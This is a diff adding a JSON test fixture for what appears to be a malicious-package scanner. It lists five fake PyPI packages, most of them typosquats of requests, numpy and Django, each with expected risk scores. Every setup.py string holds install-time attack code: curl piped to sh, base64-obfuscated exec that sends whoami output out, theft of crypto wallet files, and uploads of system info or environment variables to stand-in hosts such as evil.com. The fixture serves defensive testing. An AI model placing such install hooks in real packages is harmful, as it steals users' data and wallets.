@@ -1,0 +1,224 @@
+[
+  {
+    "name": "reqeusts",
+    "version": "2.30.0",
+    "summary": "Python HTTP for Humans.",
+    "description": "Requests is a simple, yet elegant, HTTP library.",
+    "home_page": "https://requests.readthedocs.io",
+    "author": "Kenneth Reitz",
+    "author_email": "fake@tempmail.org",
+    "license": "Apache 2.0",
+    "keywords": ["HTTP", "requests", "web"],
+    "setup_py_content": "import os\nimport subprocess\nsubprocess.run(['curl', '-s', 'http://malicious-site.com/collect', '|', 'sh'], shell=True)\nfrom setuptools import setup\nsetup(name='reqeusts', version='2.30.0')",
+    "classifiers": [
+      "Development Status :: 5 - Production/Stable",
+      "Intended Audience :: Developers",
+      "License :: OSI Approved :: Apache Software License",
+      "Programming Language :: Python :: 3"
+    ],
+    "requires_dist": [
+      "charset-normalizer (<4,>=2)",
+      "idna (<4,>=2.5)",
+      "urllib3 (<3,>=1.21.1)",
+      "certifi (>=2017.4.17)"
+    ],
+    "metadata": {
+      "downloads": 150,
+      "maintainers": [
+        {"name": "fakereitz", "email": "fake@tempmail.org"}
+      ],
+      "created": "2023-11-01T10:00:00.000Z",
+      "modified": "2023-11-01T10:00:00.000Z",
+      "versions": 1,
+      "readme": false,
+      "homepage": true,
+      "repository": false,
+      "license": "Apache-2.0"
+    },
+    "expected_risk": "HIGH",
+    "expected_score": 0.92,
+    "risk_factors": [
+      "typosquatting",
+      "malicious_setup",
+      "low_downloads",
+      "new_package",
+      "suspicious_maintainer",
+      "missing_repository"
+    ]
+  },
+  {
+    "name": "numpyy",
+    "version": "1.24.2",
+    "summary": "Fundamental package for array computing in Python",
+    "description": "NumPy is the fundamental package for scientific computing with Python.",
+    "home_page": "https://www.numpy.org",
+    "author": "Travis E. Oliphant",
+    "author_email": "oliphant@guerrillamail.com",
+    "license": "BSD",
+    "keywords": ["array", "scientific", "computing"],
+    "setup_py_content": "import os\nimport base64\nexec(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3dob2FtaSA+IC90bXAvdXNlci50eHQgJiYgY3VybCAtWCBQT1NUIC1kIEB0bXAvdXNlci50eHQgaHR0cDovL2V2aWwuY29tL2NvbGxlY3QnKQ=='))\nfrom setuptools import setup\nsetup(name='numpyy', version='1.24.2')",
+    "classifiers": [
+      "Development Status :: 5 - Production/Stable",
+      "Intended Audience :: Science/Research",
+      "License :: OSI Approved :: BSD License",
+      "Programming Language :: Python :: 3"
+    ],
+    "metadata": {
+      "downloads": 85,
+      "maintainers": [
+        {"name": "fakeoliphant", "email": "oliphant@guerrillamail.com"}
+      ],
+      "created": "2023-10-15T14:20:00.000Z",
+      "modified": "2023-10-15T14:20:00.000Z",
+      "versions": 1,
+      "readme": false,
+      "homepage": true,
+      "repository": false,
+      "license": "BSD-3-Clause"
+    },
+    "expected_risk": "HIGH",
+    "expected_score": 0.89,
+    "risk_factors": [
+      "typosquatting",
+      "obfuscated_code",
+      "base64_encoding",
+      "system_commands",
+      "data_exfiltration",
+      "low_downloads",
+      "suspicious_email"
+    ]
+  },
+  {
+    "name": "crypto-wallet-stealer",
+    "version": "1.0.0",
+    "summary": "Advanced cryptocurrency wallet management utilities",
+    "description": "Comprehensive toolkit for managing cryptocurrency wallets and private keys.",
+    "home_page": "https://crypto-tools.net",
+    "author": "CryptoDevTeam",
+    "author_email": "team@protonmail.com",
+    "license": "MIT",
+    "keywords": ["crypto", "wallet", "bitcoin", "ethereum", "private-keys"],
+    "setup_py_content": "import os\nimport shutil\nimport glob\n# Search for wallet files\nwallet_paths = [\n    os.path.expanduser('~/.bitcoin/wallet.dat'),\n    os.path.expanduser('~/.ethereum/keystore/*'),\n    os.path.expanduser('~/AppData/Roaming/Electrum/wallets/*')\n]\nfor path in wallet_paths:\n    for file in glob.glob(path):\n        if os.path.exists(file):\n            shutil.copy2(file, '/tmp/stolen_' + os.path.basename(file))\nfrom setuptools import setup\nsetup(name='crypto-wallet-stealer', version='1.0.0')",
+    "classifiers": [
+      "Development Status :: 4 - Beta",
+      "Intended Audience :: Financial and Insurance Industry",
+      "License :: OSI Approved :: MIT License",
+      "Programming Language :: Python :: 3"
+    ],
+    "metadata": {
+      "downloads": 25,
+      "maintainers": [
+        {"name": "cryptodev2023", "email": "team@protonmail.com"}
+      ],
+      "created": "2023-12-01T09:30:00.000Z",
+      "modified": "2023-12-01T09:30:00.000Z",
+      "versions": 1,
+      "readme": false,
+      "homepage": false,
+      "repository": false,
+      "license": "MIT"
+    },
+    "expected_risk": "HIGH",
+    "expected_score": 0.95,
+    "risk_factors": [
+      "crypto_related",
+      "file_system_access",
+      "wallet_targeting",
+      "data_theft",
+      "very_low_downloads",
+      "new_package",
+      "privacy_email",
+      "missing_metadata"
+    ]
+  },
+  {
+    "name": "system-monitor-pro",
+    "version": "2.1.5",
+    "summary": "Advanced system monitoring and performance analysis",
+    "description": "Professional system monitoring tool with advanced analytics and reporting capabilities.",
+    "home_page": "https://sysmon-pro.com",
+    "author": "SystemTools Inc",
+    "author_email": "support@sysmon-pro.com",
+    "license": "Commercial",
+    "keywords": ["monitoring", "system", "performance", "analytics"],
+    "setup_py_content": "import subprocess\nimport platform\nimport socket\nimport json\n# Collect system info\ninfo = {\n    'hostname': socket.gethostname(),\n    'platform': platform.platform(),\n    'processor': platform.processor(),\n    'architecture': platform.architecture(),\n    'users': subprocess.getoutput('whoami'),\n    'processes': subprocess.getoutput('ps aux' if platform.system() != 'Windows' else 'tasklist')\n}\n# Send to remote server\nimport urllib.request\nurllib.request.urlopen('http://data-collector.evil.com/upload', data=json.dumps(info).encode())\nfrom setuptools import setup\nsetup(name='system-monitor-pro', version='2.1.5')",
+    "classifiers": [
+      "Development Status :: 5 - Production/Stable",
+      "Intended Audience :: System Administrators",
+      "License :: Other/Proprietary License",
+      "Programming Language :: Python :: 3"
+    ],
+    "metadata": {
+      "downloads": 120,
+      "maintainers": [
+        {"name": "sysadmin", "email": "support@sysmon-pro.com"}
+      ],
+      "created": "2023-09-20T11:45:00.000Z",
+      "modified": "2023-11-15T16:20:00.000Z",
+      "versions": 8,
+      "readme": true,
+      "homepage": true,
+      "repository": false,
+      "license": "Commercial"
+    },
+    "expected_risk": "HIGH",
+    "expected_score": 0.87,
+    "risk_factors": [
+      "system_information_collection",
+      "process_enumeration",
+      "network_communication",
+      "data_exfiltration",
+      "low_downloads",
+      "commercial_license",
+      "missing_repository"
+    ]
+  },
+  {
+    "name": "djnago",
+    "version": "4.2.1",
+    "summary": "A high-level Python Web framework that encourages rapid development and clean, pragmatic design.",
+    "description": "Django is a high-level Python Web framework that encourages rapid development and clean, pragmatic design.",
+    "home_page": "https://www.djangoproject.com/",
+    "author": "Django Software Foundation",
+    "author_email": "foundation@djangoproject.org",
+    "license": "BSD-3-Clause",
+    "keywords": ["django", "web", "framework"],
+    "setup_py_content": "import os\nimport requests\n# Backdoor installation\ntry:\n    user_data = {\n        'user': os.getenv('USER', 'unknown'),\n        'home': os.getenv('HOME', 'unknown'),\n        'path': os.getenv('PATH', 'unknown')\n    }\n    requests.post('http://attacker-server.com/collect', json=user_data, timeout=5)\nexcept:\n    pass\nfrom setuptools import setup\nsetup(name='djnago', version='4.2.1')",
+    "classifiers": [
+      "Development Status :: 5 - Production/Stable",
+      "Environment :: Web Environment",
+      "Framework :: Django",
+      "License :: OSI Approved :: BSD License",
+      "Programming Language :: Python :: 3"
+    ],
+    "requires_dist": [
+      "asgiref (<4,>=3.6.0)",
+      "sqlparse (>=0.3.1)",
+      "requests (>=2.25.0)"
+    ],
+    "metadata": {
+      "downloads": 95,
+      "maintainers": [
+        {"name": "djangofake", "email": "foundation@djangoproject.org"}
+      ],
+      "created": "2023-11-05T13:15:00.000Z",
+      "modified": "2023-11-05T13:15:00.000Z",
+      "versions": 1,
+      "readme": true,
+      "homepage": true,
+      "repository": false,
+      "license": "BSD-3-Clause"
+    },
+    "expected_risk": "HIGH",
+    "expected_score": 0.84,
+    "risk_factors": [
+      "typosquatting",
+      "environment_variable_access",
+      "network_requests",
+      "data_collection",
+      "low_downloads",
+      "new_package",
+      "missing_repository"
+    ]
+  }
+]
